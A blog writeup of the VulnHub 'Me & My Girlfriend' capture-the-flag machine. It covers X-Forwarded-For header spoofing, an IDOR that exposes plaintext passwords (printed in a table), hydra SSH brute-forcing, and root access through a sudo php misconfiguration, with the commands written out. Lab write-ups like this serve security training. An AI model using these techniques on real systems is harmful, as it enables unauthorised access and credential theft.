---
title: "Me & My Girlfriend"
date: 2025-04-30
draft: false
summary: "Writeup for 'Me & My Girlfriend' CTF challenge on VulnHub."
tags: ["linux", "idor", "sudo"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/meandmygf/cover.webp"
  caption: "Me & My Girlfriend VulnHub Challenge"
  alt: "Me & My Girlfriend cover"
platform: "VulnHub"
---

This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, "*Ceban Corp*", something has changed from Alice's attitude towards Bob like something is "hidden", And Bob asks for our help to get what Alice is hiding and get full access to the company!
<!--more-->
To download **Me and my girlfriend**, click on the link given below:
- https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/

## Reconnaissance

To identify the target, I performed an network scan using **nmap**:

```bash
nmap -sn 192.168.1.0/24
```

After finding the target IP, I perform an **nmap** aggressive scan to find open ports, services and information about those services.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |

![](https://cdn.ziomsec.com/meandmygf/1.webp)

## Initial Foothold

### Enumeration

Since port 80 was running, I used **curl** to fetch information about the page and also accessed it on the browser.

```shell
curl http://TARGET
```

![](https://cdn.ziomsec.com/meandmygf/2.webp)

![](https://cdn.ziomsec.com/meandmygf/3.webp)

The site had an *HTML comment* that gave me a hint on how it could be accessed. I had to use the *X-Forwarded-For* header and use the localhost IP, i.e., 127.0.0.1, to get the intended result. This is because:
- '*Sorry This Site Can Only Be Accessed Local*' - it could only be accessed through localhost, i.e., 127.0.0.1.
- The commented part gave me a hint that this had something to do with the *X-Forwarded-For* header.

Hence, I started Burp Suite and configured it as my proxy using **[FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search)**.

Then I turned on my **Burp** Proxy to intercept the request and tried accessing the website. I configured **Burp** to add the following header in all the requests made to the target.

```http
X-Forwarded-For: 127.0.0.1
```

1. I went to **Proxy** and clicked on **Proxy settings**; then searched for **match and replace**.
2. I checked the *Only apply to in-scope items* and clicked on **Add**. Then, I added the header in the following manner:

![](https://cdn.ziomsec.com/meandmygf/5.webp)

3. I then added the target URL to scope by selecting it from the `HTTP history` tab and right clicking on it.

![](https://cdn.ziomsec.com/meandmygf/6.webp)

I clicked on *Register* and registered myself with the following credentials:
- username: `zbot` 
- password: `pass123`

![](https://cdn.ziomsec.com/meandmygf/7.webp)

I then logged in using these credentials.

![](https://cdn.ziomsec.com/meandmygf/8.webp)

The **Profile** page had an option to change my password. This page contained 3 fields: Name, Username and Password. Since, they were filled automatically, I could inspect it further to see if it was possible to find information for other users.

![](https://cdn.ziomsec.com/meandmygf/9.webp)

I turned on my **Burp** Proxy and refreshed this page to intercept the request.

![](https://cdn.ziomsec.com/meandmygf/10.webp)

I sent the request to **Repeater** for inspection.

![](https://cdn.ziomsec.com/meandmygf/11.webp)

The response that I received displayed the password in plaintext.

![](https://cdn.ziomsec.com/meandmygf/12.webp)

Also, upon inspecting the URL, I found that it fetched my details based on an ID.

![](https://cdn.ziomsec.com/meandmygf/13.webp)

So, if I changed the *`user_id`* parameter, I could perform **IDOR**.

> **IDOR**  (Insecure Direct Object Reference) is an access control vulnerability. It happens when an application doesn't properly check if a user is allowed to access some data and serves data on the basis of a small part of the request (like ID value).

### Exploiting IDOR

I changed the ID value and got multiple user credentials.

![](https://cdn.ziomsec.com/meandmygf/14.webp)

| id  | username       | password    |
| --- | -------------- | ----------- |
| 1   | eweuhtandingan | skuyatuh    |
| 2   | aingmaung      | qwerty!!!   |
| 3   | sundatea       | indONEsia   |
| 4   | sedihaingmah   | cedihhihihi |
| 5   | alice          | 4lic3       |
Since the target had *SSH* service enabled, I used hydra to test these usernames and passwords against it.

```bash
# saved usernames and passwords in a seperate file.
hydra -L USERLIST -P PASSLIST ssh://TARGET
```

![](https://cdn.ziomsec.com/meandmygf/15.webp)

**hydra** revealed a valid pair of credentials - so I used it to access the box using **ssh**.

```shell
ssh alice@TARGET
# enter password
```

![](https://cdn.ziomsec.com/meandmygf/16.webp)

I found the user flag inside the `.my_secret` folder.

![](https://cdn.ziomsec.com/meandmygf/17.webp)

```shell
cd .my_secret/
cat flag1.txt
```

![](https://cdn.ziomsec.com/meandmygf/18.webp)

I also found another note :(

```shell
cat my_notes.txt
```

![](https://cdn.ziomsec.com/meandmygf/19.webp)

## Privilege Escalation

To enumerate privesc vectors, I downloaded **Linux Smart Enumeration** script on my PC and transferred it to the target.
- https://github.com/diego-treitos/linux-smart-enumeration

```shell
$ cd /tmp
$ wget http://KALI:PORT/lse.sh
$ chmod +x lse.sh
```

![](https://cdn.ziomsec.com/meandmygf/20.webp)

I then executed the script.

```shell
./lse.sh
```

![](https://cdn.ziomsec.com/meandmygf/21.webp)

![](https://cdn.ziomsec.com/meandmygf/22.webp)

It discovered a **sudo** misconfiguration. I was allow to run **php** without a password. I verified the same using `sudo -l`

![](https://cdn.ziomsec.com/meandmygf/23.webp)

I used **GTFOBins** to understand how I could exploit this misconfiguration.
- https://gtfobins.github.io/

![](https://cdn.ziomsec.com/meandmygf/24.webp)

I used the following payload to exploit the misconfiguration and got root access.

```shell
$ CMD="/bin/bash" #variable storing shell type.
$ sudo php -r "system('$CMD');" #execute contents stored in the variable
```

![](https://cdn.ziomsec.com/meandmygf/25.webp)

Finally, I captured the final flag from the root directory.

![](https://cdn.ziomsec.com/meandmygf/26.webp)

## Closure

I successfully pwned the system and captured the flags. Here's how it went:
- After gaining access to the site, I discovered an **IDOR** vulnerability and used it to retrieve usernames and passwords.
- I used those credentials to **SSH** into the target system.
- I found the first flag in a hidden folder called *.my_secret*.
- I discovered that the user could execute **PHP** as sudo without a password.
- I used **GTFOBins** to find a way to exploit this and gain root access.
- Finally, I captured the second flag in the *root* directory.

That's it from my side. Until next time! :)

---
